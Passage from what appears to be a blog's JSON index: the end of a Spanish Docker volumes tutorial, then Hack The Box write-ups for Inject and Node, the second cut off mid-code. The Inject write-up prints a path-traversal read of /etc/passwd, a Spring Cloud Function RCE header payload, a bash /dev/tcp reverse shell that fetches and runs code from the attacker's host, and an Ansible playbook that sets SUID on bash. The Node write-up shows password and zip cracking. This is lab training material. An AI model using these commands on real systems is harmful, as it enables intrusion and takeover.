encotrarse en nuestro sistema hosts no van a eliminarse. Esto nos sirve un monton si vamos a trabajar con base de datos o cuando estamos desarrollando algun sistema. Existen tres tipos de maneras de poder crear nuestro volumenes y podemos usaarlos segun lo veamos conveniente.    Anonimo: Indicamos la ruta de lo que queremos almacenar en un volumen y docker se encarga de montarlo en donde lo vea conveniente. Y otro punto es que no vamos a poder referenciar nuestro volumen para que otro contenedor que creemos lo pueda usar.     Anfitrion: En este caso nosotros podemos decidir la ruta de donde se va almacenar nuestro volumen.     Nombrado: Es muy parecido al volumen anonimo, solo que este tiene una mejora y es que si vamos a poder referenciar nuestro volumen, lo que nos ayudara a poder reutilizarlo.  Bien para poder usar los volumenes, debemos a volver a abrirnos nuestro archivo previamente creado docker-compose. yml. Vamos a agregar la etiqueta volumes y le asignaremos el nombre del volumen que queremos darle en nuestro caso db-mongo. version:  3. 9 services: nodeapp:  build: .   ports:   -  3000:3000   links:   - mongo_connect mongo_connect:  image: mongo  ports:   -  27017:27017   environment:   - MONGO_INITDB_ROOT_USERNAME=firtsmiracle   - MONGO_INITDB_ROOT_PASSWORD=firtsmiracle123 volumes:  db-mongo:De la misma manera agregaremos otra etiqueta volumes dentro del nombre de nuestro contenedor, donde le indicaremos que volumen va a utilizar, en este caso db_mongo especificando la ruta en donde por defecto mongo guarda los datos /data/db  En caso de que estemos trabajando con una base de datos relacional como mysql, la ruta cambiaria y seria /var/lib/mysql, lo mismo para cualquier gestor de base de datos ya que debemos especificar segun de cual estemos haciendo uso la ruta por defecto donde se almacena la data. version:  3. 9 services: nodeapp:  build: .   ports:   -  3000:3000   links:   - mongo_connect mongo_connect:  image: mongo  ports:   -  27017:27017   environment:   - MONGO_INITDB_ROOT_USERNAME=firtsmiracle   - MONGO_INITDB_ROOT_PASSWORD=firtsmiracle123  volumes:   - db-mongo:/data/db volumes:  db-mongo:Guardamos nuestro archivo y igual que anteriormente ejecutamos docker compose up, se desplegan nuestros contenedores.  Vamos a realizar nuevamente algunas peticiones a nuestro aplicativo.  Verificamos que los datos se insertaron correctamente.  Ahora para validar que nuestro volumen es funcional, vamos a eliminar los contenedores y volveremos a levantar otros nuevos con docker compose y en consecuencia pese a que borramos los primeros con los que interactuamos realizando las peticiones, al desplegar los nuevos podremos seguir trabajando con los mismos datos. Entonces primero detenemos la ejecución y eliminamos los contenedores.  Ahora vamos a levantar nuevamente otros dos nuevos contenedores.  Finalmente validemos en nuestro navegador si los datos que insetamos antes siguen almancenado y… Genial todo funciona correctamente y de esta manera vemos el impacto que se tiene al usar los volumenes para tener una persistencia de datos en el tiempo. Pero esto no acaba aqui, ya que tambien como mencionaba antes los volumenes tambien nos ayudan en el desarrollo de nuestras aplicaciones. Para ello primero necesitaremos crear un nuevo archivo Dockerfile. dev donde colocaremos todo lo que necesitaremos para el desarrollo, donde vamos a tener un contenido similar a la de nuestro primer dockerfile, pero con algunas variaciones que vamos a ver a continuación. Si anteriomente has trabajado con Node, debes de haber utilizado una herramienta que nos permite detectar los cambios que vamos realizando y esta es nodemon, asi que vamos a usar un comando el cual va a instalarlo. FROM node:18RUN npm i -g nodemonRUN mkdir -p /home/myappWORKDIR /home/appCOPY . /home/appEXPOSE 3000CMD [ node ,  /home/myapp/index. js ]Tambien vamos a necesitar indicarle la ruta en la cual vamos a estar trabajando y eso lo hacemos con el comando WORKDIR y por lo tanto en CMD eliminaremos la ruta completa y pasaremos a usar nodemon. FROM node:18RUN npm i -g nodemonRUN mkdir -p /home/myappWORKDIR /home/myappEXPOSE 3000CMD [ nodemon ,  index. js ]Bueno, ya que vamos a usar un volumen que se encargara de crear un enlace entre el codigo de nuestra aplicación y la ruta /home/myapp, no necesitamos mas el comando copy. y a continuación ahora debemos de crear tambien un nuevo archivo de docker-compose-fordev. yml pero vamos a varias un poco el contenido. Primero, vamos a añadir la etiqueta context indicandole la ruta de la aplicación y ponemos un punto ya que es la ruta actual, despues indicamos con la etiqueta dockerfile el archivo dockerfile que ultilizara para crear el contenedor nodeapp. y finalmente añadimos un nuevo volumen dentro del nodeapp especificando la ruta que sera montada y despues la ruta del contenedor. version:  3. 9 services: nodeapp:  build:   context: .    dockerfile: Dockerfile. dev  ports:   -  3000:3000   links:   - mongo_connect  volumes:   - . :/home/myapp mongo_connect:  image: mongo  ports:   -  27017:27017   environment:   - MONGO_INITDB_ROOT_USERNAME=firtsmiracle   - MONGO_INITDB_ROOT_PASSWORD=firtsmiracle123  volumes:   - db-mongo:/data/db volumes:  db-mongo:Ya que tenemos el archivo listo lo guardamos y ejecutamos nuestro comando docker compose pero esta vez añadiremos el parametro -f donde le indicaremos el archivo de docker compose personalizado que en nuestro caso seria este que recien creamos docker-compose-fordev. yml.  Ahora vemos en nuestro navegador que al igual que antes tenemos los datos que previamente creamos.  Ahora vamos a añadir en nuestro codigo una linea en consola para que cuando listemos los estudiantes nos muestre un mensaje Listando todos los estudiantes.  Ahora simplemente al guardar los cambios, automaticamente vemos el cambio reflejado gracias a nodemon.  Pero vamos a validarlo como se debe y vamos a hacer que se ejecute el console que modificamos cuando recargamos la pagina , depaso tambien insertaremos un nuevo registro solo para probar.  Recargamos el navegador.  Toca la prueba de fuego, volvemos a revisar los logs y mira lo que encontramos.  Asi podemos tener un ambiente de desarrollo al usar docker compose y aprendimos a usar esta grandiosa herramienta. Si te percataste falta algo importante que seguro te estas preguntando, y es la siguiente. . Genial ya se como crear mis volumenes en docker pero y estos donde se almacenan por si quiero trabajar sobre estos? Pues bueno si estas en linux solo debes dirigirte a la ruta /var/lib/docker/volumes. y indicar el nombre del volumen.  Y ahora si estas usando Mac OS o Windows, basta con abrir docker desktop y dirirte a la sección Volumes. Y bueno esto seria todo por esta oportunidad, espero haberte ayudado a comprender el funcionamiento de esta grandiosa herramienta y ahora si debes ponerte manos a la obra con los contenedores ya que ahora tienes un nuevo superpoder por que ahora dominas Docker. 😎 Hasta la proxima! 😄😊. "
    }, {
    "id": 19,
    "url": "http://localhost:4000/hackthebox/htb-writeup-Inject",
    "title": "Maquina Inject - htb writeup",
    "body": "2023/07/19 - El dia de hoy vamos a resolver Inject de hackthebox una maquina linux de dificultad facil, para explotar esta maquina vamos a aprovecharnos de una ruta de subida de archivos donde existe un LFI y a traves de este podrenmos obtener acceso a archivos con credenciales y información para la explotación de una versión de spring framework que nos otorgara RCE y finalmente para elevar nuestros privilegios abusaremos de una cron job para crearnos un archivo malicioso ansible playbook, manipulando los permisos de la bash y asi convertirnos en el usuario root. Maquina curiosa asi que vamos a darle!. Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina: ❯ mkdir Inject❯ ls InjectSeguidamente con la funcion mkt crearemos nuestros directorios de trabajo: ❯ which mktmkt () {	mkdir {nmap,content,exploits,scripts}}❯ mkt❯ ls content  exploits  nmap  scriptsENUMERACION #: Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando ping: ❯ ping -c 1 10. 10. 11. 204PING 10. 10. 11. 204 (10. 10. 11. 204) 56(84) bytes of data. 64 bytes from 10. 10. 11. 204: icmp_seq=1 ttl=63 time=125 ms--- 10. 10. 11. 204 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 124. 537/124. 537/124. 537/0. 000 msVemos que la maquina nos responde, con un ttl de 63 y por proximidad seria correspondiente a una maquina linux. ESCANEO DE PUERTOS:       Parámetro   Descripción         -p-   Escaneamos todos los 65535 puertos.        –open   Solo los puertos que estén abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -oG   Guarda el output en un archivo con formato grepeable para que mediante una funcion de S4vitar nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles   Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre openPorts: ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10. 10. 11. 204 -oG openPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7. 92 ( https://nmap. org ) at 2023-07-19 18:09 GMTInitiating SYN Stealth Scan at 18:09Scanning 10. 10. 11. 204 [65535 ports]Discovered open port 8080/tcp on 10. 10. 11. 204Discovered open port 22/tcp on 10. 10. 11. 204Completed SYN Stealth Scan at 18:09, 15. 98s elapsed (65535 total ports)Nmap scan report for 10. 10. 11. 204Host is up, received user-set (0. 13s latency). Scanned at 2023-07-19 18:09:29 GMT for 16sNot shown: 65533 closed tcp ports (reset)PORT   STATE SERVICE  REASON22/tcp  open ssh    syn-ack ttl 638080/tcp open http-proxy syn-ack ttl 63Read data files from: /usr/bin/. . /share/nmapNmap done: 1 IP address (1 host up) scanned in 16. 10 seconds      Raw packets sent: 78704 (3. 463MB) | Rcvd: 78677 (3. 147MB)ESCANEO DE VERSION Y SERVICIOS: ❯ nmap -sCV -p22,8080 10. 10. 11. 204 -oN targetedStarting Nmap 7. 92 ( https://nmap. org ) at 2023-07-19 18:10 GMTNmap scan report for 10. 10. 11. 204Host is up (0. 15s latency). PORT   STATE SERVICE   VERSION22/tcp  open ssh     OpenSSH 8. 2p1 Ubuntu 4ubuntu0. 5 (Ubuntu Linux; protocol 2. 0)| ssh-hostkey: |  3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA)|  256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA)|_ 256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519)8080/tcp open nagios-nsca Nagios NSCA|_http-title: HomeService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23. 07 secondsVisulizamos información interesante de los puertos escaneados:       Puerto   Servicio   Versión         22   SSH   OpenSSH 8. 2p1       8080   HTTP   nagios-nsca Nagios NSCA   EXPLOTACION #: Comenzamos usando whatweb, para determinar las tecnologias que esta usando el servicio web. ❯ whatweb http://10. 10. 11. 204:8080http://10. 10. 11. 204:8080 [200 OK] Bootstrap, Content-Language[en-US], Country[RESERVED][ZZ], Frame, HTML5, IP[10. 10. 11. 204], Title[Home], YouTubeLa herramienta no nos reporta mucha información, asi que vamos a proceder a abrir el servicio con el navegador para visualizar el servicio.  Observamos que existe una sección de login y registro pero que esta actualmente en construcción.  En la pagina principal tambien podemos ver una sección de upload, la cual nos redirige a una ruta de subida de archivos.  Vamos a tratar de subir un archivo simple con extensión txt y vamos a interceptar la petición con burpsuite para realizar pruebas.  Interceptamos la petición y la mandamos al Repeater, y vemos como respuesta que solo podemos subir imagenes.  Si ahora alteramos la petición y cambiamos la extensión del archivo nos muestra un mensaje de subida correcta del archivo con su respectiva ruta.  Si ahora desde consola intentamos apuntar a la ruta, listando un directorio atras, obtenemos un LFI. ❯ curl -s -X GET  http://10. 10. 11. 204:8080/show_image?img=. .  javaresourcesuploadsAhora podemos listar los usuarios de el archivo /etc/passwd. ❯ curl -s -X GET  http://10. 10. 11. 204:8080/show_image?img=. . /. . /. . /. . /. . /. . /etc/passwd  | grep  sh$ root:x:0:0:root:/root:/bin/bashfrank:x:1000:1000:frank:/home/frank:/bin/bashphil:x:1001:1001::/home/phil:/bin/bashSi ahora tratamos de listar el contenido del directorio de los usuarios, observamos un archivo settings. xml en el directorio del usuario frank. Vamos a exportar el contenido y dentro obtenemos unas credenciales del usuario phill. ❯ curl -s -X GET  http://10. 10. 11. 204:8080/show_image?img=. . /. . /. . /. . /. . /. . /home/frank/. m2 settings. xml❯ curl -s -X GET  http://10. 10. 11. 204:8080/show_image?img=. . /. . /. . /. . /. . /. . /home/frank/. m2/settings. xml  -o settings. xml❯ cat settings. xml&lt;?xml version= 1. 0  encoding= UTF-8 ?&gt;&lt;settings xmlns= http://maven. apache. org/POM/4. 0. 0  xmlns:xsi= http://www. w3. org/2001/XMLSchema-instance     xsi:schemaLocation= http://maven. apache. org/POM/4. 0. 0 https://maven. apache. org/xsd/maven-4. 0. 0. xsd &gt; &lt;servers&gt;  &lt;server&gt;   &lt;id&gt;Inject&lt;/id&gt;   &lt;username&gt;phil&lt;/username&gt;   &lt;password&gt;DocPhillovestoInject123&lt;/password&gt;   &lt;privateKey&gt;${user. home}/. ssh/id_dsa&lt;/privateKey&gt;   &lt;filePermissions&gt;660&lt;/filePermissions&gt;   &lt;directoryPermissions&gt;660&lt;/directoryPermissions&gt;   &lt;configuration&gt;&lt;/configuration&gt;  &lt;/server&gt; &lt;/servers&gt;&lt;/settings&gt;Si tratamos de contectarnos por el servicio ssh, las credenciales no son correctas, y si ahora listamos dos directorios atras, encontramos otro archivo pom. xml. ❯ curl -s -X GET  http://10. 10. 11. 204:8080/show_image?img=. . /. . /. . / . classpath. DS_Store. idea. project. settingsHELP. mdmvnwmvnw. cmdpom. xmlsrctargetSi vemos el contenido vemos que esta relacionado a spring framework. ❯ cat pom. xml&lt;?xml version= 1. 0  encoding= UTF-8 ?&gt;&lt;project xmlns= http://maven. apache. org/POM/4. 0. 0  xmlns:xsi= http://www. w3. org/2001/XMLSchema-instance 	xsi:schemaLocation= http://maven. apache. org/POM/4. 0. 0 https://maven. apache. org/xsd/maven-4. 0. 0. xsd &gt;	&lt;modelVersion&gt;4. 0. 0&lt;/modelVersion&gt;	&lt;parent&gt;		&lt;groupId&gt;org. springframework. boot&lt;/groupId&gt;		&lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;		&lt;version&gt;2. 6. 5&lt;/version&gt;		&lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; Spring Framework : Spring es un framework para el desarrollo de aplicaciones y contenedor de inversión de control, de código abierto para la plataforma Java. ​ La primera versión fue escrita por Rod Johnson, quien lo lanzó junto a la publicación de su libro Expert One-on-One J2EE Design and Development. Si buscamos un poco encontramos un exploit que nos otorga RCE.  https://github. com/J0ey17/CVE-2022-22963_Reverse-Shell-ExploitSi abrimos el explit, observamos que este se aprovecha de una ruta functionRouter y envia un payload diseñado a traves de los headers donde ejecuta finalmente un comando.  Como no es tan complejo su explotación podemos hacerlo manualmente incoporando los parametros requeridos con el propio curl. Nos mandamos una traza a nuestra maquina host. ❯ curl -s -X POST  http://10. 10. 11. 204:8080/functionRouter  -H 'spring. cloud. function. routing-expression: T(java. lang. Runtime). getRuntime(). exec( ping -c 1 10. 10. 16. 2 )' -d '. '{ timestamp : 2023-07-19T18:56:07. 739+00:00 , status :500, error : Internal Server Error , message : EL1001E: Type conversion problem, cannot convert from java. lang. ProcessImpl to java. lang. String , path : /functionRouter Y recibimos la petición. ❯ tcpdump -i tun0 icmp -ntcpdump: verbose output suppressed, use -v[v]. . . for full protocol decodelistening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes18:56:22. 791783 IP 10. 10. 11. 204 &gt; 10. 10. 16. 2: ICMP echo request, id 2, seq 1, length 6418:56:22. 791819 IP 10. 10. 16. 2 &gt; 10. 10. 11. 204: ICMP echo reply, id 2, seq 1, length 64Para ganar acceso vamos a crearnos un archivo en bash de nombre index. html que nos otorgue una reverse shell, el cual nos compartiremos y almancenaremos en la maquina victima para posteriormente ejecutarlo. ❯ cat index. html#!/bin/bashbash -i &gt;&amp; /dev/tcp/10. 10. 16. 2/443 0&gt;&amp;1Realizamos la petición. ❯ curl -s -X POST  http://10. 10. 11. 204:8080/functionRouter  -H 'spring. cloud. function. routing-expression: T(java. lang. Runtime). getRuntime(). exec( curl 10. 10. 16. 2 -o /tmp/reverse )' -d '. '{ timestamp : 2023-07-19T18:58:54. 291+00:00 , status :500, error : Internal Server Error , message : EL1001E: Type conversion problem, cannot convert from java. lang. ProcessImpl to java. lang. String , path : /functionRouter }Recibimos la petición en nuestro servicio. ❯ python3 -m http. server 80Serving HTTP on 0. 0. 0. 0 port 80 (http://0. 0. 0. 0:80/) . . . 10. 10. 11. 204 - - [19/Jul/2023 18:59:09]  GET / HTTP/1. 1  200 -Ahora solo debemos ejecutarlo y ponermos en escucha con ntcat. ❯ curl -s -X POST  http://10. 10. 11. 204:8080/functionRouter  -H 'spring. cloud. function. routing-expression: T(java. lang. Runtime). getRuntime(). exec( bash /tmp/reverse )' -d '. '{ timestamp : 2023-07-19T19:05:11. 598+00:00 , status :500, error : Internal Server Error , message : EL1001E: Type conversion problem, cannot convert from java. lang. ProcessImpl to java. lang. String , path : /functionRouter }#            Obtenemos acceso como el usuario frank. ❯ ncat -nlvp 443Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Ncat: Connection from 10. 10. 11. 204. Ncat: Connection from 10. 10. 11. 204:60530. bash: cannot set terminal process group (827): Inappropriate ioctl for devicebash: no job control in this shellfrank@inject:/$ whoamiwhoamifrankComo siempre hacemos el tratamiento para obtener una full tty. frank@inject:/$ script /dev/null -c bashscript /dev/null -c bashScript started, file is /dev/nullfrank@inject:/$ ^Zzsh: suspended ncat -nlvp 443❯ stty raw -echo; fg[1] + continued ncat -nlvp 443                reset xtermfrank@inject:/$ export TERM=xtermfrank@inject:/$ export SHELL=bashfrank@inject:/$ stty rows 45 columns 184Si ahora buscamos la flag y intentamos leerla vemos que no contamos con permisos. frank@inject:/$ find / -name user. txt 2&gt;/dev/null/home/phil/user. txt^Cfrank@inject:/$ cat /home/phil/user. txtcat: /home/phil/user. txt: Permission deniedRecordemos que antes obtuvimos unas credenciales del usuario phil, asi que vamos a tratar de usar esa contraseña y migrar al usuario phil. frank@inject:/$ su philPassword: phil@inject:/$ whoamiphilAhora podemos leer la primera flag user. txt phil@inject:/$ cd /home/phil/phil@inject:~$ cat user. txt 7b309ae956b0821aef61ef39aa5d4f7eELEVACION DE PRIVILEGIOS #: Ya que somos el usuario phil, listamos los grupos a los cuales pertenecemos y vemos uno correspondiente a staff. Seguidamente listamos los recuros a los que tenemos acceso. phil@inject:~$ iduid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)phil@inject:~$ find / -group staff 2&gt;/dev/null/opt/automation/tasks/root/var/local/usr/local/lib/python3. 8/usr/local/lib/python3. 8/dist-packages/usr/local/lib/python3. 8/dist-packages/ansible_parallel. py/usr/local/lib/python3. 8/dist-packages/ansible_parallel-2021. 1. 22. dist-info/usr/local/lib/python3. 8/dist-packages/ansible_parallel-2021. 1. 22. dist-info/LICENSE/usr/local/lib/python3. 8/dist-packages/ansible_parallel-2021. 1. 22. dist-info/RECORD/usr/local/lib/python3. 8/dist-packages/ansible_parallel-2021. 1. 22. dist-info/entry_points. txt/usr/local/lib/python3. 8/dist-packages/ansible_parallel-2021. 1. 22. dist-info/WHEEL/usr/local/lib/python3. 8/dist-packages/ansible_parallel-2021. 1. 22. dist-info/METADATA/usr/local/lib/python3. 8/dist-packages/ansible_parallel-2021. 1. 22. dist-info/top_level. txt/usr/local/lib/python3. 8/dist-packages/ansible_parallel-2021. 1. 22. dist-info/INSTALLER/usr/local/lib/python3. 8/dist-packages/__pycache__/usr/local/lib/python3. 8/dist-packages/__pycache__/ansible_parallel. cpython-38. pyc/usr/local/share/fonts/usr/local/share/fonts/. uuidphil@inject:~$ /opt/automation/tasksbash: /opt/automation/tasks: Is a directoryphil@inject:~$ ls -l /opt/automation/taskstotal 4-rw-r--r-- 1 root root 150 Jul 19 20:02 playbook_1. ymlObservamos un playbook. yml, si investigamos un poco encotramos que esta relacionado a ansible.  Un playbook de Ansible® es un plano técnico de las tareas de automatización, las cuales son acciones complejas de TI cuya ejecución se lleva a cabo con muy poca intervención humana o sin ella. Vamos a crearnos un procmon, para listar los procesos que se estan ejecutando a intervalos regulares de tiempo. phil@inject:/tmp$ cat procmon. sh#!/bin/bashold_process=$(ps -eo user, command)while true; do	new_process=$(ps -eo user, command)	diff &lt;(echo  $old_process ) &lt;(echo  $new_process ) | grep  [\&gt;\&lt;]  | grep -vE  procmon|kworker|command 	old_process=$new_processdoneEjecutamos el script y obervamos que el usuario root esta ejecutando un borrado de todo lo que se encuentra en el directorio tasks. phil@inject:/tmp$ . /procmon. sh &lt; root   /usr/sbin/CRON -f&lt; root   /bin/sh -c sleep 10 &amp;&amp; /usr/bin/rm -rf /opt/automation/tasks/* &amp;&amp; /usr/bin/cp /root/playbook_1. yml /opt/automation/tasks/&lt; root   sleep 10Lo que podemos hacer es crearnos un archivo similar a playbook_1. yml para insertar un comando y al ejecutar la tarea el usuario root, podemos tratar de cambiar los permisos de la bash otorgandole suid y asi poder convertirnos en el usuario root. Para ello primero debemos crearnos un archivo reverse. yml malicioso que nos ejecute un comando, es simple pero puedes guiarte de la documentación para entenderlo mejor.  ansible-builtin-command-modulephil@inject:/opt/automation/tasks$ cat reverse. yml - hosts: localhost tasks: - name: suid to bash  ansible. builtin. shell: chmod u+s /bin/bashAhora solo debemos esperar a que se ejecute la tarea y podemos ver que la bash ahora cuenta con el privilegio suid. phil@inject:/opt/automation/tasks$ ls -l /bin/bash-rwsr-xr-x 1 root root 1183448 Apr 18 2022 /bin/bashLo que nos queda ahora es convertirnos en el usuario root, dirigirnos a su directorio personal y visualizar la segunda flag root. txt. phil@inject:/opt/automation/tasks$ bash -pbash-5. 0# whoamirootbash-5. 0# cd /rootbash-5. 0# cat root. txt 26521e5fb779f8e62fa4d068175a3b5a"
    }, {
    "id": 20,
    "url": "http://localhost:4000/hackthebox/htb-writeup-Node",
    "title": "Maquina Node - htb writeup",
    "body": "2023/07/17 - El dia de hoy vamos a resolver Node de hackthebox una maquina linux de dificultad media, para poder comprometer la maquina nos aprovecharemos la informacion lekeada del servicio expuesta en la api que nos otorgara credenciales para conectarnos al servicio, donde descargaremos un backup comprimido con información para poder ingresar al sistema, despues aprovecharemos de una inyeccion a una task de mongodb donde a traves de un campo obtendremos ejecución remota de comandos rce y finalmente mediante un binario suid podremos leeer la flag del usuario root. Ademas alternivamente vamos a ganar acceso al sistema explotando un buffer overflow en el binario suid a traves de ret2libc y ganando acceso al sistema como el usuario root. Esta maquina es divertida asi que a darle!. Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina: ❯ mkdir Node❯ ls:w NodeSeguidamente con la funcion mkt crearemos nuestros directorios de trabajo: ❯ which mktmkt () {	mkdir {nmap,content,exploits,scripts}}❯ mkt❯ ls content  exploits  nmap  scriptsENUMERACION #: Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando ping: ❯ ping -c 1 10. 10. 10. 58PING 10. 10. 10. 58 (10. 10. 10. 58) 56(84) bytes of data. 64 bytes from 10. 10. 10. 58: icmp_seq=1 ttl=63 time=109 ms--- 10. 10. 10. 58 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 108. 550/108. 550/108. 550/0. 000 msVemos que la maquina nos responde, con un ttl de 63 y por proximidad seria correspondiente a una maquina linux. ESCANEO DE PUERTOS:       Parámetro   Descripción         -p-   Escaneamos todos los 65535 puertos.        –open   Solo los puertos que estén abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -oG   Guarda el output en un archivo con formato grepeable para que mediante una funcion de S4vitar nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles   Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre openPorts: ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10. 10. 10. 58 -oG openPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7. 92 ( https://nmap. org ) at 2023-07-17 22:25 GMTInitiating SYN Stealth Scan at 22:25Scanning 10. 10. 10. 58 [65535 ports]Discovered open port 22/tcp on 10. 10. 10. 58Discovered open port 3000/tcp on 10. 10. 10. 58Completed SYN Stealth Scan at 22:25, 26. 41s elapsed (65535 total ports)Nmap scan report for 10. 10. 10. 58Host is up, received user-set (0. 11s latency). Scanned at 2023-07-17 22:25:27 GMT for 26sNot shown: 65533 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE REASON22/tcp  open ssh   syn-ack ttl 633000/tcp open ppp   syn-ack ttl 63Read data files from: /usr/bin/. . /share/nmapNmap done: 1 IP address (1 host up) scanned in 26. 51 seconds      Raw packets sent: 131086 (5. 768MB) | Rcvd: 20 (880B)ESCANEO DE VERSION Y SERVICIOS: ❯ nmap -sCV -p22,3000 10. 10. 10. 58 -oN targetedStarting Nmap 7. 92 ( https://nmap. org ) at 2023-07-17 22:26 GMTNmap scan report for 10. 10. 10. 58Host is up (0. 12s latency). PORT   STATE SERVICE      VERSION22/tcp  open ssh        OpenSSH 7. 2p2 Ubuntu 4ubuntu2. 2 (Ubuntu Linux; protocol 2. 0)| ssh-hostkey: |  2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)|  256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)|_ 256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)3000/tcp open hadoop-tasktracker Apache Hadoop|_http-title: MyPlace| hadoop-datanode-info: |_ Logs: /login| hadoop-tasktracker-info: |_ Logs: /loginService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 20. 44 secondsVisulizamos información interesante de los puertos escaneados:       Puerto   Servicio   Versión         22   SSH   OpenSSH 7. 2p2       80   HTTP   hadoop-tasktracker   EXPLOTACION #: Comenzamos usando whatweb, para determinar las tecnologias que esta usando el servicio web. ❯ whatweb http://10. 10. 10. 58:3000http://10. 10. 10. 58:3000 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, IP[10. 10. 10. 58], JQuery, Script[text/javascript], Title[MyPlace], X-Powered-By[Express], X-UA-Compatible[IE=edge]La herramienta nos reporta que se trata de un Express, lo que quiere decir que en el backend esta corriendo NodeJS. Vamos a proceder a abrir el servicio con el navegador para visualizar el servicio.  Vemos que existe una opcion de login para acceder al servicio.  Ahora ya que sabemos que por dentro corre un nodejs, para evitar aplicar fuzzing, podemos usar el depurador, para poder ver rutas por defecto del servicio tipo app. Y dentro descubrimos una ruta de usuarios.  Si tratamos de acceder a la ruta, vemos que podemos listar el contenido de usuarios con sus respectivas contraseñas hasheadas.  Procedemos a crackear las contraseñas para ello usaremos nuestra web de confianza.  https://crackstation. net/y Obtenemos contraseñas en texto claro.  La exportamos al fichero de nombre users. txt y procedemos a logearnos al servicio. ❯ cat users. txtmyP14ceAdm1nAcc0uNT:manchestertom:spongebobmark:snowflakeAl conectarnos vemos una opción de DownloadBackup, asi que lo descargamos y hacemos un decode del contenido que esta en base64 y lo exportamos con el nombre de backup.  ❯ cat myplace. backup | base64 -d &gt; backup❯ cat backup❯ file backupbackup: Zip archive data, at least v1. 0 to extractComo resultado obtenemos un comprimido protegido por contraseña. ❯ unzip backupArchive: backup  creating: var/www/myplace/[backup] var/www/myplace/package-lock. json passwordUsaremos fcrackzip y obtenemos la contraeña del comprimido. ❯ fcrackzip -b -D -u -p /usr/share/wordlists/rockyou. txt backupPASSWORD FOUND!!!!: pw == magicwordDentro observamos bastante contenido, pero al tratarse de un node. js, podemos tratar de grepear por archivos como app. js, donde podemos encontrar informacion interesante. ❯ find . | grep app. js. /www/myplace/app. js. /www/myplace/static/assets/js/app/app. jsAbrimos el archivo app. js y encontramos unas credenciales del servicio mongodb, correspondientes al usuario mark.  Como vimos que el servicio ssh se encuentra activo, podemos tratar de conectarnos con las nuevas credenciales. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted byapplicable law. Last login: Wed Sep 27 02:33:14 2017 from 10. 10. 14. 3       . -.     . -'``(|||)   ,`\ \  `-`.         88             88   /  \ '``-.  `        88             88  . -.  ,    `___:   88  88 88,888, 88  88 ,88888, 88888 88  88 (:::) :    ___    88  88 88  88 88  88 88  88 88  88  88  `-` `    ,  :   88  88 88  88 88  88 88  88 88  88  88   \  / ,. . -`  ,    88  88 88  88 88  88 88  88 88  88  88   `. / /  . -. `    '88888' '88888' '88888' 88  88 '8888 '88888'     `-. . -(  )        `-` The programs included with the Ubuntu system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted byapplicable law. Last login: Tue Jul 18 00:34:52 2023 from 10. 10. 16. 2mark@node:~$ Ahora que ganamos acceso al sistema como el usuario mark, listamos los servicios activos y vemos el puerto 27017, correspondiente a MongoDB. mark@node:~$ ss -nltpState    Recv-Q Send-Q         Local Address:Port          Peer Address:Port   LISTEN   0   128           127. 0. 0. 1:27017               *:*      LISTEN   0   128             *:22                  *:*    LISTEN   0   128            :::3000                  :::*      Si ahora listamos los procesos del sistema vemos que se esta corriendo otro app. js correspondiente a un scheduller. mark@node:~$ ps -fauxUSER    PID %CPU %MEM  VSZ  RSS TTY   STAT START  TIME COMMANDroot     2 0. 0 0. 0   0   0 ?    S  Jul17  0:00 [kthreadd]root     3 0. 0 0. 0   0   0 ?    S  Jul17  0:00 \_ [ksoftirqd/0]mongodb  1237 0. 6 11. 8 281952 89772 ?    Ssl Jul17  0:36 /usr/bin/mongod --auth --quiet --config /etc/mongod. conftom    1240 0. 0 5. 5 1008568 42148 ?    Ssl Jul17  0:02 /usr/bin/node /var/scheduler/app. jstom    1243 0. 0 9. 0 1041968 68560 ?    Ssl Jul17  0:03 /usr/bin/node /var/www/myplace/app. jsSi visualizamos el archivo obtenemos otras credenciales correspondientes a mongo. mark@node:~$ cat /var/scheduler/app. jsconst exec    = require('child_process'). exec;const MongoClient = require('mongodb'). MongoClient;const ObjectID  = require('mongodb'). ObjectID;const url     = 